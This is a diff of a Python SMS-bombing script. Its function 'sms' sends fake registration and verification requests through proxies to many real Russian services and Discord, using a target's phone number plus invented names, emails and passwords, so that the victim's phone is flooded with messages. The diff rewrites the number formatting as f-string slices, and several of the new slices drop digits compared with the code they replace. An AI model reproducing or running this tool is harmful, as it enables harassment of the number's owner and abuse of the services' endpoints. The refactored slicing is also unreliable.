@@ -485,23 +485,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					header = {
 						"Accept": "application/json, text/plain, */*",
 						"Accept-Encoding": "gzip, deflate, br",
@@ -587,25 +572,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"phone": num2,
 						"u": "U"
@@ -672,24 +640,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:10]}'
+					
 					header = {
 						"accept": "application/json, text/javascript, */*; q=0.01",
 						"accept-encoding": "gzip, deflate, br",
@@ -724,23 +676,7 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -831,25 +767,7 @@ def sms(prx, number, tm, code):
 					pass	
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'accept': '*/*',
@@ -1026,25 +944,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/plain, */*',
@@ -1132,42 +1032,12 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7({num[1:3]}){num[4:6]}-{num[7:8]}-{num[9:10]}'
 
-					nn1 = ''
-					nn2 = ''
-					nn3 = ''
-					nn4 = ''
-
-					nn1 += num[1]
-					nn1 += num[2]
-					nn1 += num[3]
-
-					nn2 += num[4]
-					nn2 += num[5]
-					nn2 += num[6]
-
-					nn3 += num[7]
-					nn3 += num[8]
-
-					nn4 += num[9]
-					nn4 += num[10]
+					nn1 = num[1:3]
+					nn2 = num[4:5]
+					nn3 = num[7:8]
+					nn4 = num[9:10]
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -1237,24 +1107,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:10]}'
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -1343,25 +1196,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': '*/*',
@@ -1460,25 +1295,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': '*/*',
@@ -1539,19 +1356,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += '7'
-					num2 += '-'
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += num[7]
-					num2 += num[8]
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'7{num[1:10]}'
 
 					header = {
 						'accept': '*/*',
@@ -1732,6 +1537,8 @@ def sms(prx, number, tm, code):
 					num2+=num[8]
 					num2+=num[9]
 					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]} {num[7:10]}'
+					
 					payload = {
 						"phoneNumber": num2,
 						"lang": "ru",
@@ -1760,22 +1567,9 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-
-					num3+=num[4]
-					num3+=num[5]
-					num3+=num[6]
-
-					num4+=num[7]
-					num4+=num[8]
-
-					num5+=num[9]
-					num5+=num[10]
+					
 					payload = {
-						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
+						"phone": f"+ {code} ( {num[1:3]} ) {num[4:6]}-{num[7:8]}-{num[9:10]}"
 					}
 					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload, proxies = proxies)
 				except:
@@ -1798,23 +1592,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')}, proxies=proxies)
 				except:
 					pass
@@ -1832,21 +1611,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:10]}'
+					
 					payload = {
 						"instanceId": "123",
 						"firstName": "Пупкин",
@@ -1883,23 +1649,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+="-"
-					num2+=num[7]
-					num2+=num[8]
-					num2+="-"
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"phone": num2,
 						"register": "true"
@@ -1925,23 +1676,7 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -1968,25 +1703,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/plain, */*',
@@ -2074,42 +1791,12 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:6]}-{num[7:8]}-{num[9:10]}'
 
-					nn1 = ''
-					nn2 = ''
-					nn3 = ''
-					nn4 = ''
-
-					nn1 += num[1]
-					nn1 += num[2]
-					nn1 += num[3]
-
-					nn2 += num[4]
-					nn2 += num[5]
-					nn2 += num[6]
-
-					nn3 += num[7]
-					nn3 += num[8]
-
-					nn4 += num[9]
-					nn4 += num[10]
+					nn1 = num[1:3]
+					nn2 = num[4:5]
+					nn3 = num[7:8]
+					nn4 = num[9:10]
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2179,24 +1866,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2232,25 +1902,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {"phone":num2,"force_sms":"true"}
 					requests.post("https://api.eapteka.ru/api/v3/user", json=payload, proxies=proxies)
 				except:
@@ -2322,20 +1975,11 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num3=""
-					num3+=num[4]
-					num3+=num[5]
-					num3+=num[6]
-					num4=""
-					num4+=num[7]
-					num4+=num[8]
-					num5=""
-					num5+=num[9]
-					num5+=num[10]
+					num2 = num[1:3]
+					num3 = num[4:6]
+					num4 = num[7:8]
+					num5 = num[9:10]
+					
 					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y", proxies=proxies)
 				except:
 					pass
@@ -2385,24 +2029,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					header = {
 						"accept": "application/json, text/javascript, */*; q=0.01",
 						"accept-encoding": "gzip, deflate, br",
@@ -2503,19 +2131,11 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num3 = ""
-					num3 += num[1]
-					num3 += num[2]
-					num2=""
-					num2 += num[3]
-					num2 += num[4]
-					num2 += num[5]
-					num4 = ""
-					num4 += num[6]
-					num4 += num[7]
-					num5 = ""
-					num5 += num[8]
-					num5 += num[9]
+					num3 = num[1:2]
+					num2 = num[3:5]
+					num4 = num[6:7]
+					num5 = num[8:9]
+					
 					header = {
 						"accept": "application/json, text/plain, */*",
 						"accept-encoding": "gzip, deflate, br",
@@ -2576,24 +2196,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"number": num2
 					}
@@ -2603,24 +2207,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:10]}'
+
 					header = {
 						"accept": "*/*",
 						"accept-encoding": "gzip, deflate, br",
@@ -2679,25 +2267,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:6]}-{num[7:8]}-{num[9:10]}'
+
 					header = {
 						"accept": "*/*",
 						"accept-encoding": "gzip, deflate, br",
@@ -2767,25 +2338,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+
 					payload = {"phone":num2,"g-recaptcha-response":"null"}
 					requests.post("https://1603.smartomato.ru/account/session", json=payload, proxies = proxies)
 				except:
@@ -2813,6 +2367,8 @@ def sms(prx, number, tm, code):
 					num2+=num[8]
 					num2+=num[9]
 					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:10]}'
+
 
 					header = {
 						"accept": "application/json, text/plain, */*",
@@ -3009,19 +2565,11 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num3 = ""
-					num3 += num[1]
-					num3 += num[2]
-					num2=""
-					num2 += num[3]
-					num2 += num[4]
-					num2 += num[5]
-					num4 = ""
-					num4 += num[6]
-					num4 += num[7]
-					num5 = ""
-					num5 += num[8]
-					num5 += num[9]
+					num3 = num[1:2]
+					num2 = num[3:5]
+					num4 = num[6:7]
+					num5 = num[8:9]
+					
 					header = {
 						"accept": "application/json, text/plain, */*",
 						"accept-encoding": "gzip, deflate, br",
@@ -3101,24 +2649,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"number": num2
 					}
@@ -3154,25 +2686,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					header = {
 						"accept": "*/*",
 						"accept-encoding": "gzip, deflate, br",
@@ -3203,23 +2718,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					header = {
 						"Accept": "application/json, text/plain, */*",
 						"Accept-Encoding": "gzip, deflate, br",
@@ -3335,24 +2835,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:10]}'
+					
 					header = {
 						"accept": "*/*",
 						"accept-encoding": "gzip, deflate, br",
@@ -3405,25 +2889,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:6]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {"phone":num2,"force_sms":"true"}
 					requests.post("https://api.eapteka.ru/api/v3/user", json=payload)
 				except:
@@ -3437,19 +2904,11 @@ def sms(prx, number, tm, code):
 				try:
 					num = number
 
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-
-					num3+=num[4]
-					num3+=num[5]
-					num3+=num[6]
-
-					num4+=num[7]
-					num4+=num[8]
-
-					num5+=num[9]
-					num5+=num[10]
+					num2 = num[1:3]
+					num3 = num[4:6]
+					num4 = num[7:8]
+					num5 = num[9:10]
+					
 					payload = {
 						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
 					}
@@ -3525,24 +2984,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:10]}'
+					
 					header = {
 						"accept": "application/json, text/javascript, */*; q=0.01",
 						"accept-encoding": "gzip, deflate, br",
@@ -3586,24 +3029,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					header = {
 						"accept": "application/json, text/javascript, */*; q=0.01",
 						"accept-encoding": "gzip, deflate, br",
@@ -3641,21 +3068,7 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:10]}'
 
 					header = {
 						"accept": "application/json, text/plain, */*",
@@ -3734,24 +3147,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+=' '
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]} {num[7:10]}'
+					
 					payload = {
 						"phoneNumber": num2,
 						"lang": "ru",
@@ -3879,23 +3276,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+="-"
-					num2+=num[7]
-					num2+=num[8]
-					num2+="-"
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"phone": num2,
 						"register": "true"
@@ -3921,25 +3303,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {
 						"phone": num2,
 						"u": "U"
@@ -3961,20 +3326,12 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num3=""
-					num3+=num[4]
-					num3+=num[5]
-					num3+=num[6]
-					num4=""
-					num4+=num[7]
-					num4+=num[8]
-					num5=""
-					num5+=num[9]
-					num5+=num[10]
+					
+					num2 = num[1:3]
+					num3 = num[4:6]
+					num4 = num[7:8]
+					num5 = num[9:10]
+					
 					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y")
 				except:
 					pass
@@ -3987,21 +3344,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+=num[7]
-					num2+=num[8]
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:10]}'
+					
 					payload = {
